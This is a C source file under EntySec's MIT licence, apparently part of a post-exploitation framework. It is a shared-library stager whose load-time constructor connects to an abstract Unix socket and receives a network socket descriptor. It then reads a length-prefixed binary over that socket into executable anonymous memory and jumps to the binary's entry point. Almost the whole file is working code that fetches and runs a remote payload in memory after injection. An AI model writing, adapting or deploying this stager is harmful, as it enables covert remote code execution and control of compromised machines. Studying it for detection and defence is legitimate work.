/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <fcntl.h>

#include <netinet/in.h>

#include <sys/auxv.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/un.h>

struct bin_info
{
    off_t start_function;
    off_t dynamic_linker_info;
    char magic_number[4];
} __attribute__((packed));

static int shared_connect(const char *name)
{
    int shared;
    struct sockaddr_un address;

    memset(&address, 0, sizeof(address));

    shared = socket(AF_UNIX, SOCK_STREAM, 0);
    address.sun_family = AF_UNIX;
    strcpy(address.sun_path, name);

    address.sun_path[0] = 0;
    while (connect(shared, (struct sockaddr *)&address, sizeof(address)) < 0);

    return shared;
}

static ssize_t shared_read_sock(int shared, void *buf,
                                size_t length, int *sock)
{
    ssize_t bytes_read;

    struct iovec iov;
    struct msghdr msg;
    struct cmsghdr *pcmsghdr;

    char buffer[CMSG_SPACE(sizeof(int))];

    iov.iov_base = buf;
    iov.iov_len = length;
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = buffer;
    msg.msg_controllen = sizeof(buffer);
    msg.msg_flags = 0;

    bytes_read = recvmsg(shared, &msg, 0);
    if (bytes_read < 0)
    {
        return -1;
    }

    pcmsghdr = CMSG_FIRSTHDR(&msg);
    *sock = *((int*)CMSG_DATA(pcmsghdr));

    return bytes_read;
}

static void exec_image(char *image, size_t image_len, int sock)
{
    void (*e_entry)(long *, long *);
    long stack[9] = {0};
    long *dynv;

    struct bin_info *image_info = (struct bin_info*)(image + image_len - sizeof(*image_info));
    e_entry = (void *)(image + image_info->start_function);

    stack[0] = 1;
    stack[1] = (intptr_t)"p";
    stack[2] = sock;

    stack[3] = (intptr_t)"LANG=C";
    stack[4] = 0;

    stack[5] = AT_BASE; stack[6] = (intptr_t)image;
    stack[7] = AT_NULL; stack[8] = 0;

    dynv = (void *)(image + image_info->dynamic_linker_info);

    printf("%s: jumping to %p loaded at %p\n", __FUNCTION__, e_entry, image);
    e_entry(stack, dynv);
}

__attribute__((constructor))
void init(void)
{
    int sock;
    int length;
    int shared;
    int flags;

    char buffer[4];

    unsigned char *image;

    shared = shared_connect("#IPCSocket");
    if (shared < 0)
    {
        return;
    }

    memset(buffer, 0, 4);
    if (shared_read_sock(shared, buffer, 4, &sock) < 0)
    {
        return;
    }

    flags = fcntl(sock, F_GETFL, 0);
    flags &= ~O_NONBLOCK;

    if (fcntl(sock, F_SETFL, flags) < 0)
    {
        return;
    }

    if (recv(sock, &length, sizeof(length), MSG_WAITALL) < 0)
    {
        return;
    }

    length = ntohl(length);

    image = mmap(NULL, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (image == NULL)
    {
        return;
    }

    if (recv(sock, image, length, MSG_WAITALL) < 0)
    {
        return;
    }

    exec_image(image, length, sock);
}